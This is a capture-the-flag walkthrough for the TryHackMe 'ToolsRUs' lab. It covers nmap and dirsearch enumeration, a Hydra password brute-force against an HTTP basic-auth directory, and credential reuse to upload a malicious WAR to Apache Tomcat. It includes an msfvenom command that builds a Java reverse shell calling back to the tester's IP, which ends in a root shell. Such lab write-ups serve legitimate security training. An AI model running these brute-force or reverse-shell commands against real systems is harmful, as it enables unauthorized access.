
[TryHackMe Link](https://tryhackme.com/room/toolsrus){ .md-button }

!!! example "Description"

    <p id="desc" style="font-size:15px"></p>

In this section, I will discuss about gaining access to a system by exploiting vulnerabilities in various services. The services include Apache Tomcat, Apache Coyote JSP Engine, Apache Jserv, and an HTTP server on port 80.

## <b>Scanning</b>

* Assigned IP address: &nbsp; <b id="ip" style="color:purple"></b>
  
* Open Ports: 

| <p style="font-size:14px; color: black">PORT</p>      | <p style="font-size:14px; color: black">SERVICE</p> |  <p style="font-size:14px; color: black">DESCRIPTION                          |
| :---------: | :---------: | :----------------------------------: |
| <p id="p1" style="font-size:14px; color: purple"></p>      | <p id="s1" style="font-size:14px; color: purple"></p>  |<p id="d1" style="font-size:14px; color: purple"></p>   |
| <p id="p2" style="font-size:14px;  color: purple"></p>     | <p id="s2" style="font-size:14px; color: purple"></p>  |<p id="d2" style="font-size:14px; color: purple"></p> |
| <p id="p3" style="font-size:14px;  color: purple"></p>     | <p id="s3" style="font-size:14px; color: purple"></p>  |<p id="d3" style="font-size:14px; color: purple"></p> |
| <p id="p4" style="font-size:14px;  color: purple"></p>     | <p id="s4" style="font-size:14px; color: purple"></p>  |<p id="d4" style="font-size:14px; color: purple"></p> |


* Nmap Report:
  ```sh linenums="1" hl_lines="6 11 14 18"
    # Nmap 7.93 scan initiated Wed Feb 22 10:11:28 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.4.144
    Nmap scan report for 10.10.4.144
    Host is up (0.15s latency).
    Not shown: 996 closed tcp ports (reset)
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 460e76fbb6a2f7f78536656f8809f7e8 (RSA)
    |   256 a1bc5d3478f4e8d4091805ef9d9072c5 (ECDSA)
    |_  256 0757145539dfc56296f9fc4883cf127e (ED25519)
    80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
    |_http-favicon: Apache Tomcat
    |_http-title: Apache Tomcat/7.0.88
    |_http-server-header: Apache-Coyote/1.1
    8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
    |_ajp-methods: Failed to get a valid response for the OPTION request
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.93%E=4%D=2/22%OT=22%CT=1%CU=33697%PV=Y%DS=5%DC=I%G=Y%TM=63F630B
    OS:F%P=aarch64-unknown-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS
    OS:=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M
    OS:505ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68
    OS:DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
    OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
    OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
    OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
    OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
    OS:=40%CD=S)

    Network Distance: 5 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Wed Feb 22 10:11:59 2023 -- 1 IP address (1 host up) scanned in 30.78 seconds

  ```

## <b>Enumerating Apache Coyote JSP Engine</b>

At first, my plan was to exploit the Apache JSP Engine by uploading a malicious WAR file to obtain a shell. Since I was familiar with this method, I felt confident. However, I was unable to pass the authorization process.

In my attempts to gain access to the Tomcat Manager, I initially turned to a Python script to brute force default logins for Apache Tomcat. Unfortunately, this approach also failed. 

## <b>Enumerating the HTTP Server</b>

I then shifted my focus to the HTTP server running on port 80, where I discovered a simple page that hinted at the development of the site. 

<img id="image1" />

Utilizing a dirsearch Python script, I was able to locate potentially hidden pages and directories that could provide further clues and entry points.

```sh linenums="1" hl_lines="21-23"
    Target: http://10.10.4.144/

    [10:13:58] Starting: 
    [10:14:03] 403 -  297B  - /.ht_wsr.txt                                     
    [10:14:03] 403 -  300B  - /.htaccess.bak1
    [10:14:03] 403 -  302B  - /.htaccess.sample
    [10:14:03] 403 -  300B  - /.htaccess.orig
    [10:14:03] 403 -  300B  - /.htaccess.save
    [10:14:03] 403 -  301B  - /.htaccess_extra
    [10:14:03] 403 -  300B  - /.htaccess_orig
    [10:14:03] 403 -  298B  - /.htaccess_sc
    [10:14:03] 403 -  298B  - /.htaccessBAK
    [10:14:03] 403 -  298B  - /.htaccessOLD
    [10:14:03] 403 -  290B  - /.htm
    [10:14:03] 403 -  299B  - /.htaccessOLD2                                   
    [10:14:03] 403 -  291B  - /.html
    [10:14:03] 403 -  300B  - /.htpasswd_test
    [10:14:03] 403 -  296B  - /.htpasswds
    [10:14:03] 403 -  297B  - /.httr-oauth
    [10:14:36] 200 -  168B  - /index.html                                       
    [10:14:47] 401 -  458B  - /protected/data/                                  
    [10:14:47] 401 -  458B  - /protected/runtime/
    [10:14:47] 301 -  298B -  /guidelines
    [10:14:49] 403 -  299B  - /server-status                                    
    [10:14:49] 403 -  300B  - /server-status/
```

## <b>Exploiting '/guidelines' page</b>

After running the dirsearch script, I was able to identify two promising directories that could lead to further leads, namely `protected` and `guidelines`. The former sounded highly secured, but to my surprise, it was not. While I was filling out the question, I decided to check out the `/guidelines` page, and found a username called `bob`.

<img id="image2" />

Leveraging this discovery, I was able to brute force Bob's password using Hydra, which gave me access to the `protected` directory. It was a simple HTTP Basic Authorization Request which can be brute forced with the following command:

!!! tip "Hydra Command"
    <p id="desc" style="font-size:15px">hydra $IP -l bob -P ~/rockyou.txt http-get /protected -V</p>
    


<img id="image3" />

I successfully obtained Bob's login credentials, and used them to access the page that I had discovered earlier.

## <b>Exploiting Apache Tomcat with Harvested Credentials</b>

When I logged in, I discovered that the Authorization mechanism used for the Tomcat Service and the `/protected` directory were the same. 

<img id="image4" />

This allowed me to reuse the credentials that I had previously harvested. With access granted, I uploaded a Java WAR file to the manager and made a reverse shell from it.

!!! Bug "Msfvenom Payload"
    <span>msfvenom -p java/shell_reverse_tcp lhost=10.17.3.217 lport=5432 -f war -o shell.war</span>

<img id="image5" />

Also, I made a listener, before I accessed {++http://10.10.4.144:1234/shell/++} giving me the shell.


## <b>Gaining Root access</b>

Surprisingly, I was granted `root` access, rather than the expected `www-data` shell. Easy-Peasy

```sh
root@ip-10-10-4-144:/# cat root/*
cat root/*
{--REDACTED--}
cat: root/snap: Is a directory
```

!!! success ""
    <span>Peace-out!</span>

<script>

// JSON object
const data = {
    "desc": "Practise using tools such as dirbuster, hydra, nmap, nikto and metasploit",
    "ip":  "10.10.4.144",
    "ports": "22/tcp,ssh,OpenSSH 7.2p2 Ubuntu;80/tcp,http,Apache httpd 2.4.18;1234/tcp,http,Apache Tomcat/Coyote JSP engine 1.1;8009/tcp,ajp13,Apache Jserv (Protocol v1.3)",
    "difficulty":"easy",
    "id": "3"
}


function updateHTML() {

    const keys = Object.keys(data);
    const values = Object.values(data);

    for(var z=0; z < keys.length; z++){

        if(keys[z] === "ports"){
            const ports = data.ports.split(';');
            for(var i = 0; i < ports.length; i++){
                document.getElementById("p"+(i+1)).innerHTML = ports[i].split(',')[0].toUpperCase();
                document.getElementById("s"+(i+1)).innerHTML = ports[i].split(',')[1].toUpperCase();
                document.getElementById("d"+(i+1)).innerHTML = ports[i].split(',')[2];
            }
        }
        else{
            try{
            document.getElementById(keys[z]).innerHTML = values[z];
            }
            catch(error){
                console.log(values[z]);
            }
        }
    }

    // replace the values with your specific filenames and number of images and img tags
    const numImgTags = document.getElementsByTagName('img').length;

    for (let i = 1; i <= numImgTags; i++) {
    const imgTag = document.getElementById('image' + i);
        if (imgTag) {
            imgTag.src = '../images/'+data.difficulty[0]+data.id+'-image' + i + '.png';
        }
    }


}

updateHTML();
</script>